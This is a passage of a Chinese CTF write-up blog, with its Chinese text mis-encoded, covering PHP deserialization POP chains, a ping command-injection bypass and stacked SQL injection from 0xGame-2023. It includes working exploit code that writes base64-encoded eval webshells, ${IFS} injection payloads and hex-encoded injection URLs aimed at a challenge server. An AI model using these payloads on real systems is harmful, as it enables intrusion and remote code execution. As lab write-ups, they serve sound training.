<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"wanna_fl.ag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åˆæ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œä¸ä¼šå°±å¤šè¡¥è¡¥ã€‚<br>ä¸²ä¸€ä¸‹é“¾å­ï¼š</p>
<blockquote>
<p>musca-&gt;misca-&gt;milaoshu<br>æœ€åä½¿ç”¨phpä¼ªåè®®æ¥è¯»å–flag.phpæ–‡ä»¶ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d498fd23f9f1421ab5eda7a7459ab1a1.png" alt="123"><br>é“¾å­ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span><span class="token comment">//é‡ç‚¹</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">musca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">misca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">fei</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">milaoshu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//arrayç»•è¿‡æ•°ç»„</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="WEEK3-sseerriiaalliizzee"><a href="#WEEK3-sseerriiaalliizzee" class="headerlink" title="[WEEK3]sseerriiaalliizzee"></a>[WEEK3]sseerriiaalliizzee</h3><p>çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–ã€file_put_contentsåˆ©ç”¨<br>æ–‡ç« åˆ†äº«ï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>
        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no way, fuck off"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸²å¥½é“¾å­ï¼š</p>
<blockquote>
<p>Start-&gt;CTF-&gt;Flag</p>
</blockquote>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>
        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part1</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part2</span><span class="token operator">=</span><span class="token string single-quoted-string">'PD8gZXZhbCgkX1BPU1RbMV0pOw=='</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>0xGame-2023</title>
    <url>/2023/10/06/0xGame-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h2><p>F12æŸ¥çœ‹æºç ï¼Œmain.jsæ–‡ä»¶é‡Œæœ‰flag<br><img src="https://img-blog.csdnimg.cn/0f8d7e6202574ec0a759d419ed97bf7b.png" alt="1"></p>
<h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// flag in flag.php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…ˆè¿›è¡Œæ•°ç»„ç»•è¿‡a,bã€‚nameå¯ä»¥ä½¿ç”¨phpä¼ªåè®®è¿›è¡Œè¯»å–<code>php://filter/convert.base64-encode/resource=flag</code>ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>cä¼ å…¥1024.1aå³å¯ç»•è¿‡ã€‚</p>
<h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h2><p>é—®ä½ å•¥ä½ å†™å•¥å°±è¡Œäº†ã€‚ã€‚ã€‚</p>
<h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h2><p><img src="https://img-blog.csdnimg.cn/4a66a3f4f0c949cc82de767ad82aa088.png" alt="1"><br>æ˜¯ä¸€ä¸ªpingé¢˜ç›®ï¼ŒæŸ¥çœ‹æºç <br><strong>&#x2F;api.php?source</strong><br><img src="https://img-blog.csdnimg.cn/d5e483c94b15420989adff91a42f44bb.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å°±æ˜¯è¾¨åˆ«ipåœ°å€åè¿›åˆ¶æ˜¯å¦åˆæ³•</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 4 '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span> <span class="token string single-quoted-string">' 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é‡ç‚¹æ˜¯ipä¼ å…¥çš„å€¼<br><img src="https://img-blog.csdnimg.cn/0000633d27ea4222bd497e48dc1922be.png" alt="2"><br>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>ip=127.0.0.1|ls``ip=127.0.0.10000||ls</code><br><img src="https://img-blog.csdnimg.cn/480d98ce0ba9467fa140c77c5dd89dd9.png" alt="1"><br>ç”±äºè¿‡æ»¤çš„æœ‰å†…å®¹ï¼Œç©ºæ ¼å¯ä½¿ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œä½¿ç”¨base64ç¼–ç å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<blockquote>
<p><code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4=|base64$&#123;IFS&#125;-d&gt;&gt;513.php</code></p>
</blockquote>
<p>è¿æ¥èšå‰‘æ‹¿åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/f521f056cd724f2f8e85d9b2a945a12f.png" alt="1"></p>
<h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h2><p>çŸ¥è¯†ç‚¹ï¼šSQLæ³¨å…¥ï¼ˆå †å æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€é¢„å¤„ç†ï¼‰<br>æç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/ea2dbfeb1c804919a79f91fb8cd2e71c.png" alt="1"><br>æŸ¥çœ‹ç¦ç”¨å‡½æ•°,fuzzä¸€ä¸‹ï¼Œå‘ç°ä»¥ä¸‹å­—ç¬¦è¢«è¿‡æ»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/a575a24b97be4713ba7423ed92ff0f9e.png" alt="1"></p>
<p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQLçš„SQLé¢„å¤„ç†(Prepared)</a><br><a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQLæ³¨å…¥å®æˆ˜ä¹‹æŠ¥é”™æ³¨å…¥ç¯‡ï¼ˆupdatexml extractvalue floorï¼‰</a></p>
<p>å€Ÿä¸€ä½å¸ˆå‚…çš„è„šæœ¬</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

<span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> Group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

